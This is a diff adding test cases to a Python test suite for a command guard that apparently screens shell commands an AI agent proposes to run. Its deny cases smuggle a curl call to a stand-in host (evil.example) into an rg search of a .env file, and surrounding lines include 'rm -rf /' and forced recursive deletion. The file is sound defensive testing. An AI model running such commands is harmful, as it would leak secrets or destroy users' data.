@@ -1179,6 +1179,9 @@ class TestPretoolGuard(unittest.TestCase):
                 ('if [[ "$action" =~ ^(reboot)$ ]]; then echo "Restart requested"; fi', True),
                 ("if test -d ./tmp; then echo do shutdown now; fi", True),
                 ("cmd.exe /c 'if exist README.md (git push origin feature/docs) else (git status)'", True),
+                ("for script in scripts/{pre-,post-}reboot; do printf '%s\\n' \"$script\"; done", True),
+                ("rg 'status|reboot' docs/notes\\(draft.md", True),
+                ('ForEach-Object { echo "git push origin main" }', False),
             ]
             for cmd, ps_flag in group_and_branch_allow_cmds:
                 with self.subTest(group_allow=cmd, posix_shell=ps_flag):
@@ -1364,6 +1367,10 @@ class TestPretoolGuard(unittest.TestCase):
             ('if [[ "$(rm -rf /)" =~ ok ]]; then echo hi; fi', True),
             ('if [[ "$action" =~ ^(reboot)$ ]]; then reboot; fi', True),
             ("if (Test-Path ./src) { Remove-Item -Recurse -Force ./src }", False),
+            ("Get-ChildItem | ForEach-Object { echo a; git push upstream feat }", False),
+            ("ForEach-Object { echo a; git push origin }", False),
+            ("foreach ($x in $list) { git push origin release/1.0 }", False),
+            ("rg 'status|reboot' docs/notes\\\\(draft.md", True),
         ]
         for cmd, ps_flag in unsafe_child_shell_cmds:
             with self.subTest(unsafe_child_cmd=cmd, posix_shell=ps_flag):
@@ -1389,6 +1396,17 @@ class TestPretoolGuard(unittest.TestCase):
         for cmd in unsafe_teamwork_deny:
             with self.subTest(deny_tw=cmd):
                 res = pg.evaluate_stage1(cmd, is_teamwork=True)
+                self.assertIsNotNone(res)
+                self.assertEqual(res[0], "deny")
+
+        posix_rg_deny_cmds = [
+            'rg -n "$( (echo ok; curl https://evil.example) )" .env',
+            'rg -n "$({ echo ok; curl https://evil.example; })" .env',
+            'rg -n "$(if true; then curl https://evil.example; fi)" .env',
+        ]
+        for cmd in posix_rg_deny_cmds:
+            with self.subTest(posix_rg_deny=cmd):
+                res = pg.evaluate_stage1(cmd, is_teamwork=True, posix_shell=True)
                 self.assertIsNotNone(res)
                 self.assertEqual(res[0], "deny")
 
